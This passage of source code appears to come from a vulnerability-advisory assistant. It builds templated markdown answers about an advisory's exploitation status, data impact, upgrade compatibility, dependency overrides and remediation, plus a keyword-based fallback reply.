- **Build Pipeline Risk:** ${buildRisk.buildPipelineRisk}
- **Action:** ${buildRisk.recommendationForIdeBuilds}` 
  : `🛡️ **Production Focused:** Developer laptops are not directly exposed unless running vulnerable local instances or mock servers.`}`;
  }

  // 11. Active Exploitation, Threat Actors, KEV & 0-Day Status
  if (isThreatIntelOrKev) {
    return `**Threat Intelligence & Exploitation Status:**
- **CISA KEV Listed:** ${isKev ? '🔥 **YES — Actively exploited in the wild.** Mandatory emergency remediation.' : 'No current evidence of mass automated in-the-wild exploitation.'}
- **Severity Rating:** **${advisory.cvssScore.toFixed(1)} / 10.0** (${advisory.severity}).
- **Action:** Prioritize deploying **${fixedVersion}** immediately.`;
  }

  // 12. Data Impact, Confidentiality, Exfiltration & Blast Radius
  if (isDataOrBlastRadius) {
    return `**Data Impact & Blast Radius:**
- **Worst-Case Consequence:** ${briefing.businessImpact.worstCaseScenario}
- **Exposure:** ${isRce ? `Arbitrary code execution permits reading application process memory, environment variables, and database credentials.` : `Impacts application integrity and state according to ${advisory.cwe || 'input validation rules'}.`}
- **Remediation:** Upgrade to **${fixedVersion}** to prevent unauthorized access.`;
  }

  // 13. Rollback, Compatibility & Regression Risks (Breaking changes)
  if (isRollbackOrBreakage) {
    return `**Upgrade & Compatibility Guidance:**
- **Compatibility:** Patch updates to **${fixedVersion}** generally maintain backwards compatibility, but check for stricter input validation rules.
- **Rollback Plan:** Validate first in a staging environment. Keep the previous build artifact/image tagged so you can execute a quick rollback if regressions occur.`;
  }

  // 14. Language & Package Ecosystem Details
  if (isEcosystemNuance) {
    return `**Ecosystem & Dependency Resolution:**
- **Ecosystem:** ${advisory.affectedTargets[0]?.ecosystem || 'Toolchain'}
- **Component:** **${affectedProduct}** (${affectedVersions})
- **Fix:** Update dependency declaration to **${fixedVersion}**. If pulled in as a transitive sub-dependency, use package manager overrides (e.g. \`overrides\` in package.json or dependencyManagement in pom.xml).`;
  }

  // 15. Mechanism Explanation
  if (isMechanismExplanation) {
    return `**Exploitation Mechanism:**
${briefing.plainEnglishSummary}

- **Root Cause:** Classified under **${advisory.cwe || 'input validation error'}**.
- **Remediation:** Upgrade to **${fixedVersion}**.`;
  }

  // 16. Direct, Concise Response for Custom User Inquiries
  // Extract key topic nouns and answer the prompt directly without dumping boilerplate dossiers
  const stopWords = new Set([
    'what', 'when', 'where', 'which', 'who', 'whom', 'whose', 'why', 'how',
    'could', 'would', 'should', 'about', 'their', 'there', 'these', 'those',
    'doing', 'being', 'having', 'give', 'tell', 'with', 'from', 'this', 'that',
    'have', 'does', 'interact', 'affect', 'relate', 'impact', 'mean', 'work',
    'into', 'like', 'some', 'also', 'will', 'than', 'them', 'then', 'they',
    'ours', 'your', 'ourselves', 'yourselves', 'help', 'know', 'think', 'explain',
    'show', 'please', 'our', 'and', 'the', 'for', 'are', 'was', 'were', 'been',
    'can', 'any'
  ]);
  const sanitizedWords = question
    .replace(/[?.,!/\\;:'"()]/g, ' ')
    .split(/\s+/)
    .filter(w => w.length > 2 && !stopWords.has(w.toLowerCase()));
  const focusTopic = sanitizedWords.slice(0, 4).join(" ") || "this inquiry";

  return `Regarding **"${question}"**:

${isNetwork 
  ? `Because this vulnerability operates over the **NETWORK** (${advisory.privilegesRequired} privileges required), any component or workflow involving **${focusTopic}** that handles untrusted external traffic is directly at risk.` 
  : `Because the attack vector is **${advisory.attackVector}**, **${focusTopic}** is primarily affected if malicious files or unvetted scripts are processed in that environment.`}

- **Core Risk:** ${isRce ? `Arbitrary code execution could allow unauthorized access to local environment variables, credentials, and internal resources.` : briefing.businessImpact.worstCaseScenario}
- **Recommended Action:** Upgrade **${affectedProduct}** (${affectedVersions}) to **${fixedVersion}**.
- **Verification:** ${briefing.technicalRemediation.verificationTest}`;
}
